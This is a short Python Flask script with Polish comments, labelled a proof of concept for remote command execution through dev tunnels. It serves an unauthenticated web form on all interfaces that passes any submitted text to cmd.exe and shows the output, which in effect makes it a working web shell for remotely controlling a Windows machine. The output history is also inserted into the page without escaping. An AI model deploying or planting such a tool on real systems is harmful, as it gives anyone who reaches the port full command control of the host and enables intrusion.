from flask import Flask, request, redirect, url_for
import subprocess, locale

app = Flask(__name__)

# globalny bufor "pseudo-terminala"
history = []

@app.route("/")
def index():
    # render historii jako pseudo-CLI
    output = "\n".join(history)
    return f"""
    <h2>POC - Remote Command Execution przez devtunnels</h2>
    <form method="post" action="/run">
        <input type="text" name="cmd" placeholder="Komenda..." style="width:400px;">
        <input type="submit" value="Wykonaj">
    </form>
    <div style="border:1px solid #ccc; padding:10px; margin-top:10px;
                font-family: monospace; white-space: pre-wrap;
                height:400px; overflow-y:scroll; background:#111; color:#0f0;">
        {output}
    </div>
    """

@app.route("/run", methods=["POST"])
def run_cmd():
    cmd = request.form.get("cmd", "").strip()
    if not cmd:
        return redirect(url_for("index"))

    try:
        result = subprocess.run(
            ["cmd.exe", "/c", cmd],
            capture_output=True
        )
        enc = locale.getpreferredencoding()
        stdout = result.stdout.decode(enc, errors="replace")
        stderr = result.stderr.decode(enc, errors="replace")
        output = stdout + stderr
    except Exception as e:
        output = f"Exception: {e}"

    # dodajemy do historii
    history.append(f"C:\\> {cmd}\n{output}")

    return redirect(url_for("index"))

if __name__ == "__main__":
    app.run(debug=False, host="0.0.0.0", port=5000)
